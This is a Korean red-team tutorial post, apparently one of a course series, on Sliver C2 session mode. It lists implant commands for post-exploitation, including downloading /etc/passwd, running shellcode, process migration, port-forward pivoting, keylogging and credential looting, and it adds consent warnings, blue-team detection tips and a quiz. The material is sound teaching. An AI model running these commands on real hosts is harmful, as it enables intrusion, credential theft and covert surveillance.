---
layout: post
title: "Sliver Week 5: Session 모드 + Interactive Commands"
date: 2026-05-19 11:00:00 +0900
categories: security red-team c2 sliver senior
---

## 학습 목표

- Session vs Beacon 차이.
- Interactive command set.
- File operation + process.

## 1. Session vs Beacon

- **Session**: 상시 연결. real-time interactive. OpSec 약함.
- **Beacon**: 주기 callback (예: 60초). 잠자며 조용. OpSec 강함.

Lab에서는 Session 학습. 실제 engagement는 Beacon 우선.

## 2. Session 시작

```sliver
sliver > use 1
sliver (SESSION) >
```

## 3. 파일 시스템

```sliver
> ls /etc
> pwd
> cd /tmp
> cat /etc/hostname
> download /etc/passwd ./loot/
> upload ./exploit.sh /tmp/
> rm /tmp/exploit.sh
```

## 4. Process

```sliver
> ps
> ps -e bash       # filter
> kill 1234
> execute ls -la
> execute-shellcode shellcode.bin
> migrate <pid>    # process migration
```

## 5. Network

```sliver
> ifconfig
> netstat
> portfwd add --remote 192.168.1.5:22 --bind 127.0.0.1:2222
```

## 6. Shell

```sliver
> shell
$ id
$ exit
```

OpSec 약함 (TTY 생성). Beacon 모드에선 사용 안 함.

## 7. Screenshot / Keylog (Lab만)

```sliver
> screenshot
> keylogger    # 매우 explicit consent 필요
```

법적 위험 큼. authorized engagement 명시 동의.

## 8. Loot Management

```sliver
> loot add file ./creds.txt --type credential
> loot
```

증거 보관 + 보고서.

## 9. Blue Team

- Session = 상시 outbound. 정상 application의 통신 패턴과 비교.
- Process anomaly: 부모-자식 관계 (예: explorer.exe → unknown.exe).
- Lateral movement signal (portfwd).

## 10. 자가평가

### Q1. Session vs Beacon?
1. **Session 상시, Beacon 주기**
2. 같음 3. 반대 4. 무관

**정답: 1.**

### Q2. migrate?
1. **다른 process로 implant 이동**
2. UI 3. 빠름 4. 무관

**정답: 1.**

### Q3. shell의 위험?
1. **TTY 생성 → 탐지**
2. 안전 3. UI 4. 무관

**정답: 1.**

### Q4. portfwd?
1. **lateral movement pivot**
2. UI 3. 빠름 4. 무관

**정답: 1.**

### Q5. Blue team process anomaly?
1. **부모-자식 비정상 관계**
2. UI 3. 빠름 4. 무관

**정답: 1.**

## 11. 다음 주차

[Week 6: Beacon 모드].
